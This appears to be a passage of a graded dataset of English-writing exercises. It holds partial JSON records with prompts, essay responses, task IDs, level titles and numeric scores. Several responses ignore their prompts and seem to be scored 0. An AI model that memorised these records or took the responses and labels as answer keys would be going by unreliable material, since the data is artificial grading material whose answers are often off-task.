It was suggested that due to  construction business is not stable our share value had slumped.\n\nIt's true that there was a period of time two months ago when our revenue dropped 5%, but what happened was due to the resignation of the old CEO, Greg Johnson. Consequently, our business was affected temporarily. \nTherefore, it's with great pleasure that I announce that our sales figures have already bounced back and have never been healthier, due in large part to the new CEO,Harry Levi, well known and respected in the business.\nAll these factors contradict the irresponsible stories that have appeared lately in the press.\n\nLet me state unequivocally that we are maintaining stability in this ustable market because we habe secured three big contracts for the coming three years, profit is guaranteed. \nYou, our shareholders, can feel confident and safe in the knowledge that you're partners in a successful, growing company.\n\nWe'll be sending all shareholders a detailed five year road map of the Future Foundations to address any fears the slanderous rumors may have caused.\n\nThank you for your support.\n\nBest wishes,\n\nBob Cooper\n\nConstruction Company", "task_id": "c2ac7c1e-b808-4c21-8ee1-c1abac0c2a49", "level_title": "Correspondence", "label": 4}

Options: general cargo safety and stowage; staffing levels and working conditions; general condition and maintenance of the vessel; safety standards; pollution [SEP] Response: One common issue in pollution on board ships is improper handling of oily waste or ballast water, which can lead to marine contamination and heavy environmental penalties. Some vessels may lack adequate systems for treating waste, or the crew might not be fully trained in environmental procedures. To reduce this risk, ships should install certified oily water separators, follow MARPOL regulations strictly, and conduct regular environmental awareness training for all personnel.

The beach is not just a destination; it's a sanctuary where I find solace and rejuvenation. Two main aspects make this place my favorite: its natural beauty and the profound sense of peace it brings.\n\nAspect X: The Natural Beauty\nThe beach is a canvas painted with the most vibrant colors of nature. The golden sand stretches endlessly, meeting the azure waves that dance rhythmically to the shore. The sound of the waves crashing gently against the rocks is like a soothing melody, calming my mind and soul. The sight of the sun setting over the horizon, casting a warm, golden glow over the water, is a spectacle that never fails to captivate me. The natural beauty of the beach, with its serene landscapes and harmonious sounds, is a major reason why it holds a special place in my heart.\n\nAspect Y: The Sense of Peace\nBeyond its physical beauty, the beach offers an unparalleled sense of peace. Walking along the shore, feeling the cool breeze against my skin, and listening to the gentle lull of the waves, I find a deep sense of tranquility. Whether I'm reading a book under the shade of a palm tree, collecting seashells, or simply sitting and watching the waves, the beach provides a perfect escape from the hustle and bustle of everyday life. This sense of peace and relaxation is essential for my well-being, making the beach my ultimate retreat.\n\nConclusion\nIn conclusion, the beach is my favorite place because of its stunning natural beauty and the profound sense of peace it offers. It is a place where I can connect with nature, find inner calm, and recharge my spirit.

Write a paragraph or two explaining which techniques seem most useful to you. Type in the input box. Write 150-200 words. [SEP] Response: The Importance of Mental Health\nMental health is a crucial aspect of overall well-being that often goes overlooked. It encompasses our emotional, psychological, and social well-being, affecting how we think, feel, and act. Understanding the importance of mental health is essential for leading a balanced and fulfilling life.\n\nEmotional Well-being\nMental health plays a significant role in our emotional well-being. It influences how we handle stress, relate to others, and make decisions. Good mental health allows us to cope with life's challenges, maintain healthy relationships, and experience positive emotions. Conversely, poor mental health can lead to emotional instability, anxiety, and depression.\n\nPhysical Health\nThere is a strong connection between mental and physical health. Chronic stress and mental health disorders can contribute to physical health problems such as heart disease, high blood pressure, and weakened immune systems. Taking care of our mental health can improve our physical health, leading to a healthier and more active lifestyle.\n\nProductivity and Performance\nMental health also impacts our productivity and performance in various aspects of life, including work and education. When we are mentally healthy, we can focus better, think more clearly, and perform tasks efficiently. Poor mental health can hinder our ability to concentrate, make decisions, and complete tasks, affecting our overall productivity.\n\nSocial Relationships\nHealthy mental health is vital for maintaining strong social relationships. It enables us to communicate effectively, empathize with others, and build meaningful connections. Mental health issues can strain relationships, leading to isolation and loneliness. By prioritizing mental health, we can foster healthier and more supportive social networks.\n\nSeeking Help\nRecognizing the importance of mental health also means acknowledging when to seek help. Mental health professionals, such as therapists and counselors, can provide support and guidance for those struggling with mental health issues. Seeking help is a sign of strength and a crucial step towards recovery and well-being.\n\nIn conclusion, mental health is a fundamental component of overall health and well-being. By understanding its importance and taking steps to maintain it, we can lead happier, healthier, and more productive lives.\n\n", "task_id": "81ee255e-d4fa-4f81-b77f-dfcf3b5cf541", "level_title": "16-Upper Advanced", "label": 0}

Estimated operating costs range from $6 to $14 per barrel for bitumen and $18 to $22 per barrel for synthetic crude. Supply costs are slightly higher, ranging from $14 to $24 per barrel for bitumen and $36 to $40 per barrel for synthetic crude. Current projections estimate that oil supply will reach 3.9 million barrels per day by 2015.\n\nConclusion:\nThere is strong potential for expansion in traditional markets. However, to support projected growth, new markets or significant market expansion will be required.\n\nRecommendations:\n\nClosely monitor crude oil prices to ensure economic feasibility.\n\nGather more operational and geological data to refine cost estimates.\n\nEvaluate transportation and labor costs, especially for skilled workers.\n\nBegin pilot testing to determine technical and environmental impacts.

It was just after closing time, and she was tucked away in a corner, working on a project. The library was empty except for the librarian, who was already locking up.\n\nSuddenly, Sarah noticed a shadow pass by her table. At first, she assumed it was just the librarian, but when she looked up, no one was there. Confused, she shrugged it off—until she heard faint footsteps echoing across the room. She followed the sound to the back of the library, where she saw a figure standing near the old shelves. It was a woman, dressed in a faded dress from another era. The figure turned and looked right at her before vanishing into thin air.\n\nSarah hasn’t been back to that library since, and I don’t blame her! But she swears it was a ghost.

Write 150-200 words. [SEP] Response: Reasons To Write An Email To Your Boss\nHere are some common reasons for which you may have to write an email to your manager or supervisor:\nApplying for leave or requesting time off: While many organisations use scheduling tools and software to simplify the process of taking time off, a professional email asking your manager to approve your leave is a common practice in most workplaces.\nClarifying doubts: When you have specific questions about workplace practices or your responsibilities that require clarification from your boss, emailing them is one of the most effective ways to address them. This is particularly common for new employees and team members.\nUpdating progress: You may have to write an email to your boss updating them about certain tasks or telling them that you have completed your work. Alternatively, you may have to write an email to request an extension for certain deadlines or explain unforeseen challenges.\nExpressing gratitude: Whether it is after a positive performance appraisal or a team meeting where your manager publicly praised your achievements, sending an email thanking them and expressing your gratitude is important.\nReporting an incident: When raising an official complaint or simply reporting a conflict with a colleague, you may have to write an email to your supervisor explaining certain incidents or situations.\nHow To Write An Email To A Manager\nYou can follow these steps and learn how to write an email to a manager:\n1. Identify the purpose of the email\nBefore you write, spend some time identifying the exact reason you want to send the email. This can help ensure that you mention vital information only and keep the email concise. If the email requires some additional documents or files, locate them before you start writing the email.\n2. Choose a suitable subject line\nAdd a short email subject line that best summarises the purpose of the message. This can help your manager understand what to expect in the email and prioritise it if the email is urgent. The subject line should ideally be a phrase no longer than five to six words. Here are some examples of subject lines to consider:\nFinal report submission\nClarification regarding project deadline\nExtension request for submitting the presentation\nThank you for your support and guidance\n3. Start with a greeting\nMost professional emails begin with a greeting or a salutation. This comes immediately after the subject line and usually contains your manager's name and preferred title. If this is the first time you are writing your supervisor an email and are unsure which greeting to use, it might be better to use standard professional salutations. Some examples include:\nDear Vikas\nDear Vikas Gupta\nDear Mr Gupta\nDear Vikas Sir\nHello Vikas\n ", "task_id": "f5b9e75a-4373-4e94-86eb-0df64619d29a", "level_title": "14-Advanced", "label": 0}

{"text": "Prompt Level: 13-Advanced [SEP] Prompt: A website has invited you to write your opinion on the topic of corporate social responsibility. Read the postings before you begin. Remember the structure you've learned on how to construct an argument. Write 200-250 words. [SEP] Response: The Big Online Debate\nDo you believe companies have a responsibility to society? Or do you think a company's only responsibility is to its shareholders? We invite you to join this discussion by posting your opinion on corporate social responsibility (CSR). Below are some quotes from recent submissions. We look forward to hearing from you!\n\nFor CSR\n\nCompanies have a big impact on society. They should help the communities where they operate. After all, those communities are letting them do business there. It's a two-way street. And it's the same with sustainable operations and fair employee benefits. The former secures future possibilities, and the latter ensures high productivity and low turnover.\n– lil@213\n\nThe reason CSR makes good business sense, the reason it contributes to the bottom line, is because consumers care. Companies with a good CSR record are rewarded by customer loyalty. Consumers are happy, the company performs well and communities around the world benefit.\n– Jack@MSU\n\nAs an integrated part of society, corporations need to conform to social expectations, and that entails helping the community.\n– James.W@efstudent.com\n\nAgainst CSR\n\nThe problem with corporate social responsibility is that corporations don't have social responsibility. Milton Friedman has pointed out that the real responsibility of business is to increase its profits; business is not answerable to society's expectations but to the shareholders'.\n– theG8T\n\nIt's great that corporations are spending huge sums of money on development projects across the world, but these sums of money are usually still inconsiderable relative to total earnings. In this sense, it's still quite a cheap marketing device to buy a good public image.\n– JackD_92\n\nIt's the government's job to make and enforce laws and regulations that will benefit the greater public. Corporations will need to conform to these regulations, but by no means should they be put in the driver's seat.\n– patty925", "task_id": "8f1a0c16-d259-4737-af06-b6b6eb9e9799", "level_title": "13-Advanced", "label": 0}

The shipment, involving a large quantity of black market tobacco products, was expected to arrive by yacht (Empress of the Seas) at 2:30 a.m.\n\nA raid was conducted at the dock based on this intelligence. Several suspects attempted to flee the scene; however, most were successfully apprehended and detained. Among those captured were Barry Black, the primary suspect in a year-long investigation, and Wayne White. Notably, three human mules were also taken into custody.\n\nThe seized cargo consisted of approximately $5 million worth of illegal cigarettes and cigars, marking the largest shipment intercepted to date. While no narcotics were found, evidence suggests a potential link to broader drug smuggling operations, warranting further investigation.\n\nThe confiscated goods were logged and secured upon return to the station at 4:54 a.m. This operation represents a significant success in disrupting black market tobacco distribution.\n\n", "task_id": "431f9c4e-8305-4cd4-9660-f2e24bd311df", "level_title": "Police and Immigration", "label": 5}

Flexible schedules or remote work options can go a long way.\n\nListening: Feeling heard is huge. It creates an atmosphere of trust and respect.

[SEP] Response: Breaking and entering is a crime that occurs when an individual enters another person's dwelling or remains there against the will of the person who normally resides there.\n\nAt this point, the question that comes to mind is clear: What is considered a dwelling? To answer this question, we must turn to the Supreme Court's case law, and not just to one ruling, but to several, since the concept of residence has been modified and refined over time.\n\nIf we want to see a definition of residence, we must turn to Supreme Court Ruling 1108/1999, of September 6, which states: \"The home is the closed, legitimately occupied place where private, individual, or family life takes place, even if the occupation is temporary or accidental.\"\n\nTherefore, following this ruling, we cannot confuse it with the habitual residence, as it is a broader concept. This can be seen in Supreme Court Ruling 3620/2020, which refers to second homes, stating:\n\n\"The complainant, in her testimony, answered, in response to questions from the defense, that she no longer lived in that house. It is clear from the rest of the information provided in her statement that what she was saying was that the property did not have the status of a habitual residence because it did not It met the minimum conditions of habitability, although it is indisputable that she had left the property in the morning and returned at night, carrying out her private and domestic life within it. Therefore, it was not simply a place where she kept some belongings, nor an open space, indiscriminately available to third parties.\n\nShe had the keys to the property, and therefore the possibility of protecting her private life from the intrusion of third parties whom she could demand not to enter or leave. Therefore, there can be no doubt that, even if she were not the owner, and even regardless of whether or not it constituted her \"sole\" residence or her domicile in the sense of \"habitual residence,\" it constituted a dwelling for criminal purposes.\n\n\n", "task_id": "bb0d114c-9550-4f27-9138-b2eb14c39437", "level_title": "Law", "label": 5}

Among Hindus the most widespread custom is the lighting of diyas (small earthenware lamps filled with oil) on the night of the new moon to invite the presence of Lakshmi, the goddess of wealth. In Bengal the goddess Kali is worshipped. In North India the festival also celebrates the royal homecoming of Rama (along with Sita, Lakshmana, and Hanuman) to the city of Ayodhya after defeating Ravana, the 10-headed king of the demons, thus connecting the festival with the holiday of Dussehra. In South India the festival marks Krishna’s defeat of the demon Narakasura. Some celebrate Diwali as a commemoration of the marriage of Lakshmi and Vishnu, while others observe it as the birthday of Lakshmi.\n\nDuring the festival, diyas are lit and placed in rows along the parapets of temples and houses and set adrift on rivers and streams. Homes are decorated, and floors inside and out are covered with rangolis, consisting of elaborate designs made of colored rice, sand, or flower petals. The doors and windows of houses are kept open in the hope that Lakshmi will find her way inside and bless the residents with wealth and success.", "task_id": "56de3bdd-b83e-4dd4-9213-446b7e00e3cd", "level_title": "15-Advanced", "label": 0}

Briefly comment on whether you found the verdict appropriate. Write 150-200 words.\n\nChatGPT said:\nCase Report: Tort Action for Trespassing\n\nIn this case, the plaintiff, the Byron family, accused the defendant, Medina, of unlawfully entering their home. According to the Byron family, Medina broke into their residence during the night, causing severe emotional distress and terror to the family members. Although it was unclear whether any valuables were stolen, the act of ransacking the house was confirmed.\n\nMedina claimed he believed the house was empty and that he entered out of fear and in search of shelter. Despite this explanation, the court found Medina guilty of trespassing, recognizing the act as a criminal offense. As a result, Medina was fined $1,000, to be paid in two installments, with one payment due immediately. In addition, the court ordered Medina to complete 300 hours of community service.\n\nThe verdict appears appropriate, considering the violation of the family's privacy and the emotional harm caused. While Medina’s intention may not have been malicious, unlawful entry into someone’s home, especially at night, justifies both a financial penalty and community service to emphasize accountability and deterrence.\n\nYou said:\nRewrite the termination section of the contract to take into account possible discrimination either against or by the employer or employee.

Write 150-200 words. [SEP] Response: El Coco is a well-known legendary creature often used by parents as a cautionary tale to encourage children to behave.  Parents often use the story of El Coco to scare children so they behave well. The creature is said to come at night to take away disobedient or sleepless children who do not go to bed or who misbehave. Though it is rarely described in detail, El Coco is typically imagined as a dark, shadowy monster that hides in closets or under beds, waiting for the right moment to appear.\nEl Coco is not always described the same way. Sometimes it looks like a monster with big eyes and sharp teeth. Other times, it is just a shadow or a ghost that hides under the bed or in the closet. Because of this, children are often afraid of the dark.\nThe story of El Coco has been told for hundreds of years . The legend of El Coco has deep roots in Spain and is passed down from generation to generation. One of the most famous references says: “Duérmete niño, que viene el Coco.” This phrase, which means “Sleep, child, or the Coco will come,” This shows how popular and old the legend is.\nEven today, many people in Spain still know about El Coco. It represents a way for adults to teach children the importance of rules and bedtime. Today, El Coco remains a powerful cultural symbol and a reminder of how myths and stories shape behavior and tradition.\n", "task_id": "f03e111e-8a30-48fe-991b-6adfea2444ad", "level_title": "16-Upper Advanced", "label": 5}

[SEP] Response: \nDrug regulation in the U.S. has evolved significantly to protect public health. Before 1900, drug sales were largely unrestricted, often lacking medical proof. The landmark Pure Food and Drug Act of 1906 mandated essential quality control, requiring manufacturers to accurately label ingredients and purity. Further strengthening oversight, the Food, Drug, and Cosmetic Act of 1938 was pivotal, demanding new drugs prove both safety and efficacy before market entry. This legislation also established crucial regulations for habit-forming substances, ensuring responsible prescribing. Currently, the Food and Drug Administration (FDA) strictly oversees all aspects of drug production and sales. Its responsibilities include ensuring medicines are safe and effective for their intended use, and that all labeling and packaging provide truthful, informative details. The FDA distinguishes between over-the-counter (OTC) drugs, deemed safe for general public use, and prescription medications, which require physician oversight and pharmacist dispensing. This comprehensive framework aims to safeguard consumers by controlling drug development and availability.\n", "task_id": "fc1b0754-a143-4181-840a-0f045bd66fb8", "level_title": "Pharmacy", "label": 5}

Write 150-200 words. [SEP] Response: One of the most fascinating legendary creatures in India is the Rakshasa, a mythical demon often featured in Hindu and Buddhist mythology. Rakshasas are typically depicted as fearsome, shape-shifting beings with supernatural powers. They are known to be malevolent, often causing harm to humans and gods alike. In many stories, they are portrayed as cunning and evil, capable of assuming any form they desire to deceive and manipulate.\n\nThe most famous Rakshasa in Indian mythology is Ravana, the king of Lanka in the epic Ramayana. He was a powerful, ten-headed demon who kidnapped the goddess Sita, leading to the epic battle between him and Lord Rama. Despite their evil nature, Rakshasas are not always portrayed as entirely wicked. Some are shown as protectors or even noble warriors in certain tales, adding depth to their character.\n\nRakshasas are often depicted as beings with a fierce appearance, with sharp teeth and red eyes, but they can also have human-like qualities. Their shape-shifting abilities and association with dark magic make them both terrifying and intriguing, symbolizing the struggle between good and evil in Indian mythology.", "task_id": "f03e111e-8a30-48fe-991b-6adfea2444ad", "level_title": "16-Upper Advanced", "label": 5}

Consider investing in some basic repairs, especially for plumbing and electrical systems.

These improvements may also make your insurance premiums more manageable.\n\nLiability Coverage: Since the building is older, consider limiting your liability coverage to match the size and layout of the premises.

Sometimes, leaders focus more on numbers than people, which can really drain motivation. If you feel comfortable, you could try having a conversation with them to see if they’re open to suggestions on boosting team morale. If not, it might be worth considering other options where your hard work will be valued.\nWith Tia, it’s normal to feel down when things aren’t working out, especially when you had hopes for the relationship. Try to give yourself some time to process things and figure out what you need in a relationship. Take things slowly and remember that it’s okay to focus on yourself right now.\nStay strong, man, and reach out anytime.\nAD", "task_id": "9032f3ed-5da1-4efe-b4dd-c9470bb35d65", "level_title": "16-Upper Advanced", "label": 5}

[SEP] Response: New Bird Species Description\n\nRecent DNA testing conducted at our institute has revealed the discovery of a new bird species closely related to the American robin (Turdus migratorius). This species was previously misidentified, but genetic analysis confirms its distinctiveness.\n\nIn terms of appearance, the new bird is slightly smaller than the American robin but has a noticeably larger bill. The male’s plumage differs as well—it is rustier in tone and less vibrant red compared to the typical robin. These subtle physical differences had gone unnoticed until now.\n\nWhile this bird inhabits the same type of terrain as the American robin—open woodlands, gardens, and parks—its migratory behavior sets it apart.

Use some of the language you have learned for criticizing in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: The obsession with celebrity culture has become a troubling aspect of modern society. Celebrities are often elevated to the status of untouchable idols, despite their flaws and shortcomings. Take someone like [insert celebrity name], for example—while they may be talented in their field, their personal actions and public behavior often reflect a complete disconnect from reality. They use their platforms to promote unattainable lifestyles, often endorsing products or ideals that are superficial at best, and harmful at worst. The celebrity-driven narrative of perfection distorts the self-image of their audience, particularly younger generations who may feel pressure to emulate these unrealistic standards.\n\nAdditionally, the culture of celebrity worship distracts from more meaningful accomplishments and real-world issues. Instead of focusing on individuals who are genuinely making a difference in areas like science, social justice, or education, we choose to put the spotlight on people who have mastered the art of self-promotion. This not only perpetuates shallow values but also diverts attention from the hard work and dedication that truly deserves admiration.

And a great power comes with a great responsibility.

Do you have any thoughts? \n\nWell, Frisko Shipping was founded in 2001 by Bill Frisko. And today it is in 20 cities all over the world. \n\nIf I can draw your attention to this slide, you can see in the bar graph that our profit was 5 million dollars last year. Looking at the pizza graph you see the company owns 10% of the global market. \n\nTo work here, you must be enthusiastic and find inspiration anywhere. That was how Bill Frisko started. Some years ago, he fell into the ocean and was bitten by a shark. And a passing ship saved Bill's life. That moment inspired him to start his own shipping Company. \n\nIf you think inspiration can be found anywhere and want to do things differently, welcome to Frisko shipping! \n", "task_id": "5c89b5ef-f9e4-44c0-bd77-31ed1d856ff0", "level_title": "Presentations", "label": 3}

These five were each sentenced to five years' imprisonment and fined $5,000 on February 20, 1970. The convictions were all reversed on appeal by the United States Court of Appeals for the Seventh Circuit on November 21, 1972. The reasons for the reversal involved bias by the judge and his refusal to permit defense attorneys to question prospective jurors regarding cultural bias. The Justice Department decided not to re-try the case.\n\nDuring the trial, all the defendants and both defense attorneys were cited for contempt and sentenced to jail, but those convictions were also overturned.

With Kudos Advertising Agency's intensive media campaign, we anticipate capturing significant market share and brand recognition swiftly. The investment is expected to be recouped within four years from opening, positioning us strongly to start realizing profits by the fifth year. Should the economy remain stable, the recouping period and profit realization could occur even sooner, potentially cutting the timelines in half.\n\n### Risk Assessment\n\nOur risk assessment accounts for potential economic downturns, ensuring that the projected figures remain realistic under varying economic conditions. The primary risk lies in economic instability; however, with conservative projections, we maintain a secure position even during downturns. The planned intensive media campaign by Kudos Advertising Agency will mitigate market entry risks, enhancing our visibility and customer acquisition rates.

[SEP] Response: Stressful situations are an inevitable part of daily life, but simple strategies can help navigate them effectively. To start, practicing mindfulness can be a game-changer. Take a few minutes each day to focus on your breathing, clear your mind, and center yourself—this helps reduce stress and enhances clarity.\nPlanning ahead is another useful technique. Organize your tasks and prioritize them. Break larger goals into smaller, manageable steps to avoid feeling overwhelmed. Keeping a to-do list or using productivity apps can be beneficial.\nWhen tensions rise, physical activity works wonders. A brisk walk, yoga, or even stretching can release endorphins and improve your mood. Pair this with a healthy diet and adequate sleep, as physical well-being directly affects mental health.\nLastly, don’t underestimate the power of connection. Reach out to friends or family, or find supportive communities. Sharing concerns and seeking advice can lighten the burden.\nAbove all, be kind to yourself. Recognize that setbacks happen, and perfection isn’t the goal—progress is. Implementing these habits can turn chaos into calm, one step at a time.\n", "task_id": "9032f3ed-5da1-4efe-b4dd-c9470bb35d65", "level_title": "16-Upper Advanced", "label": 5}

The incident occurred at night, and although Medina claimed to believe the house was empty and entered only in fear, the court found this justification insufficient. The plaintiff’s family experienced emotional distress and a sense of being terrorized as their home was ransacked. Although there was no clear evidence of theft or mention of specific valuables taken, the act of forced entry and the damage caused were enough to warrant a criminal offense.\n\nThe court imposed a fine of $1,000 to be paid in two installments—one immediately—and assigned 300 hours of community service. The verdict appears appropriate, balancing the severity of the intrusion with the lack of malicious intent. Medina’s actions had serious emotional consequences for the family, and the punishment reflects both accountability and an opportunity for rehabilitation.", "task_id": "bb0d114c-9550-4f27-9138-b2eb14c39437", "level_title": "Law", "label": 5}

You take a call from a potential new client who wants your company to undertake some research on student attitudes toward e-learning in comparison with traditional classroom learning. Listen to the voicemail message left by the client and take notes on what she wants. [SEP] Response: Introduction\n\nThe rapid advancement of technology has significantly transformed the landscape of education, particularly with the rise of online learning platforms and virtual campuses. As universities adapt to these changes, understanding students' preferences and behaviors concerning online classes during vacations can help institutions develop better strategies for enhancing educational experiences. This research aims to investigate the willingness and frequency of new students attending online classes during vacation if provided with a virtual campus, along with their reasoning.\n\nPlan\n\nThis project will span three months, focusing on a qualitative approach to gather in-depth insights from new students enrolled in the fall semester. The study will involve conducting interviews that explore students' perspectives on attending online classes during vacation periods. The analysis will provide valuable information to educational institutions for improving their online learning strategies and engagement during non-traditional academic times.\n\nQuestions\n\nThe research will revolve around the following key questions:\n\nWould you attend online classes during vacation if we have a virtual campus?\nHow often would you attend these online classes during vacation?\nWhy would you choose to attend or not attend online classes during vacation?\nMethodologies\n\nThe research will employ a qualitative approach, focusing on the collection of rich, detailed responses from participants through interviews. The methodologies will include:\n\nParticipant Selection: New students enrolled in the fall semester will be selected to participate in the study. Efforts will be made to ensure a diverse representation of students from various disciplines and backgrounds.\n\nInterview Process: Semi-structured interviews will be conducted to allow participants to express their views freely while ensuring that the key questions are addressed. The interviews will be recorded (with participants' consent) and transcribed for analysis.\n\nData Analysis: The transcriptions will be coded and analyzed using thematic analysis to identify patterns and themes in students' responses. This qualitative method will facilitate a deep understanding of students' perspectives and the factors influencing their decisions.\n\nPurpose\n\nThe primary purpose of this research is to understand new students' attitudes towards attending online classes during vacation if provided with a virtual campus. By exploring the frequency of attendance and the reasons behind their choices, this study aims to provide actionable insights for educational institutions to improve online learning offerings and strategies, ultimately enhancing student engagement and satisfaction during non-traditional academic times.

{"text": "Prompt Level: Insurance [SEP] Prompt: Your friend is about to open a secondhand clothes shop. He doesn’t have much capital, and is renting a very old building. He has got a few quotes for property and liability insurance, but they have been very high. He asks you to do a risk assessment of the premises. Have a look at your checklist, then write him an email advising him of the changes he has to make. Write 150-200 words. [SEP] Response: Dear Eric,\n\nThank you for the fun viewing appointment this morning! As we already talked about, there are a few potential hazards, you need to further look into. First of all the exterior: I noticed loose bricks on the wall facing the side-walk. This is a serious hazard because falling bricks could injure passengers walking by. Next are the drainpipes. They were blocked! If your drainpipes are blocked, it can cause damage to your roof and it could even start leaking. You should have the drainpipe cleaned every three months. Also I noticed some clutter on the sidewalk. This could cause pedestrians to slip and fall. If this happens, you are liable for possible damage. You might need to pay their medical bill for example. \nAs for the interior, I also found a few fixable issues: The poor lighting and non-existing air-conditioning creates an unsafe environment for your employees to work in. The stacked boxes block the sprinklers and would therefore be a serious problem in the event of fire. Also I was wondering how often you get your fire extinguishers checked? They need to be checked every three months to insure their proper functionality. I would also advise you to get rid of the loose chemicals in your store. Be aware of those chemicals you really need and store them safely. They are a medical hazard to your employees and could be a fire hazard, too.\n\nIf you have any further questions, don’t hesitate to ask!\n\nKind regards,\nMarie", "task_id": "9e54df01-235a-418f-9836-724a7d2eda5e", "level_title": "Insurance", "label": 4}

[SEP] Response: When comparing Tokyo and New York City, it’s easy to see why they are often considered two of the most iconic metropolises in the world. Both are buzzing with energy, diversity, and endless opportunities, but they offer distinctly different experiences.\n\nTokyo is a city of contrasts. It’s meticulously clean and orderly, with an incredible public transport system that runs with precision. The culture emphasizes respect and harmony, making it feel safe and welcoming, even in a city of nearly 14 million people. From futuristic neighborhoods like Akihabara to serene shrines in Meiji Jingu, Tokyo blends its modern innovation with deep-rooted traditions. And, of course, its food—from sushi to ramen—is world-famous.\n\nNew York City, on the other hand, thrives on its raw energy and vibrancy. It’s loud, dynamic, and unapologetically chaotic in the best way. The subway system may not have Tokyo’s level of efficiency, but it connects people to neighborhoods brimming with unique personalities, from the art-filled streets of Brooklyn to the towering skyscrapers of Manhattan. NYC feels like the center of the world, a melting pot of cultures where ambition and creativity are celebrated.\n\nWhile Tokyo feels like a symphony—precise, harmonious, and polished—New York is more like jazz: unpredictable, soulful, and alive.

The integration of targeted messaging aimed at both the local civilian population and enemy combatants demonstrated significant influence on operational outcomes. It was observed that clear, culturally sensitive communication helped to build trust and reduce hostilities among the local populace, fostering a more cooperative environment.\n\nKey observations highlighted the importance of tailoring messages to resonate with distinct audience segments. The use of local languages and dialects enhanced message receptivity, while aligning narratives with community values proved effective in promoting cooperation. Additionally, real-time feedback mechanisms facilitated adjustments to strategies, ensuring relevance and impact.\n\nFor future operations, it is recommended to invest in comprehensive cultural training for PSYOPS personnel to deepen understanding of local contexts. Furthermore, establishing stronger collaboration with intelligence units can improve message accuracy and timing, maximizing effectiveness. Regular assessments of PSYOPS outcomes should be implemented to refine approaches continually, adapting to evolving circumstances.

[SEP] Response: How to find counterfeit goods\n\nHere is the way to find counterfeit goods when you do shopping.\nBe aware of those statements and call the police as soon as you think you accidentally perchaced counterfeit goods.\n\nCounterfeit goods are anywhere in the world these days. They are fake products designed to imitate genuine items such as luxury fashin, electronics, CDs, DVDs, medicines, and even food. While they may seem like a bargein, they come with serious risks. We should know that.\n\nThe Impact of Counterfeit Goods on Society\nCounterfeiting harms businesses by reducing sales and damaging brand reputation. Governments lose tax revenue, affecting public services. More importantly, counterfeit goods can be dangerous—fake medicines may contain harmful substances, and counterfeit electronics often fail safety standards. Additionally, counterfeit trade is linked to organized crime, funding illegal activities.\n\nHow to recognize a Fake?\nRecognizing counterfeit goods is crucial. Signs include poor-quality materials, incorrect logos, and suspiciously low prices. Authentic products often have serial numbers, security tags, or certificates of authenticity. If a deal seems too good to be true, it likely is. Check the website of the company (shopping site) who runs the business. You can check the comments form the viewers or customers as well.\nYou can find some negative comments from there and find out if it's suspecious.\n\nWhat to Do If You Discover Counterfeit Goods\nIf you suspect a product is fake, avoid buying it. Report counterfeit goods to brand owners, consumer protection agencies, or law enforcement. Purchasing fake goods supports illegal trade and harms businesses. By spreading awareness, you can help prevent counterfeiting.\n\nStaying informed protects both consumers and businesses.

[SEP] Response: Of the nine contortion techniques presented—metaphor, hyperbole, symbolism, free writing, loop writing, listing, questioning, and cubing—the ones that seem most useful to me are metaphor and questioning. Metaphor is powerful because it allows you to transform abstract or complex ideas into more concrete and accessible images or concepts, facilitating communication and understanding, in addition to enriching the text with layers of meaning. Questioning, on the other hand, stimulates critical reflection, helps deepen reasoning, and can open up new perspectives, making the writing process more dynamic and exploratory.\n\nIn addition, loop writing also attracts a lot of attention because it allows you to revisit and expand ideas in a non-linear way, creating unexpected connections and boosting creativity. This technique can be especially useful for breaking down blocks and exploring different angles of a topic, making the text richer and more fluid. In general, these techniques complement each other and, depending on the context, combining them can be an effective strategy for improving the writing and content production process.", "task_id": "81ee255e-d4fa-4f81-b77f-dfcf3b5cf541", "level_title": "16-Upper Advanced", "label": 5}

[SEP] Response: Subject: Incident Brief: InterStar Airways Flight 293 Nose Gear Misalignment\n\nHi [Pilot's Name],\n\nI hope this email finds you well. I wanted to share an interesting incident that occurred on June 13, 2010, involving InterStar Airways Flight 293, which might be of interest from an operational perspective.\n\nThe flight initially departed from Oakland heading to Phoenix but shortly after takeoff, the crew received an error message indicating a problem with the nose landing gear shock absorber. As a precaution, the flight was diverted to San Jose for a visual inspection, where it was confirmed that the nose gear was misaligned with the wheels turned 90 degrees.\n\nGiven the situation, the captain made a prudent decision to divert to San Francisco International Airport, favoring its longer runway and superior emergency services capabilities. To ensure a safe landing, the aircraft flew for several hours to burn off fuel and reduce landing weight.\n\nThe cabin crew were briefed on emergency procedures, with instructions to evacuate from the rear if necessary. Remarkably, during the landing, the nose gear tires deflated but the aircraft stayed aligned on the runway centerline, and all passengers were able to deplane normally without any injuries.\n\nThis incident underscores the importance of thorough emergency preparedness and the value of having contingency plans. It could be a good case study for our next briefing session.\n\nFeel free to reach out if you have any thoughts or if there are details you'd like to discuss further.\n\nBest regards,", "task_id": "9150118b-791e-4dcf-8016-7addd4f3e673", "level_title": "Aviation", "label": 5}

{"text": "Prompt Level: Office [SEP] Prompt: It's one month later and Keith hasn't adhered to the dress code at all. In fact, he's got worse! Not only does he still wear shorts and sneakers to work sometimes, he has dyed his hair bright green. Write the letter of final warning. Write 100-150 words. [SEP] Response: Dress code at work\nIn the corporate environment, the dress code plays a fundamental role in defining the company's image and culture. It is not limited to the external appearance of employees, but also reflects the values, professionalism and even the identity of the organization.\nA well-defined dress code helps to convey a clear message about what is considered appropriate and acceptable in terms of attire in the workplace. This is especially important in companies that have direct contact with external clients or partners, where the appearance of employees can influence the perception of the brand and even affect business relationships.\n\nIn addition, a dress code contributes to creating a more professional and respectful work environment. When employees dress in accordance with the guidelines established by the company, it helps to promote a sense of unity and cohesion among teams, as well as reducing the possibility of conflicts related to dress.\n\nHowever, it is important to emphasize that the dress code should not be a source of embarrassment or discrimination in the workplace. The guidelines should be clear, fair and applied consistently to all employees, regardless of their hierarchical position, gender, age or ethnicity.", "task_id": "c230af5f-0ba4-4f12-b80c-26facbe2da6d", "level_title": "Office", "label": 0}
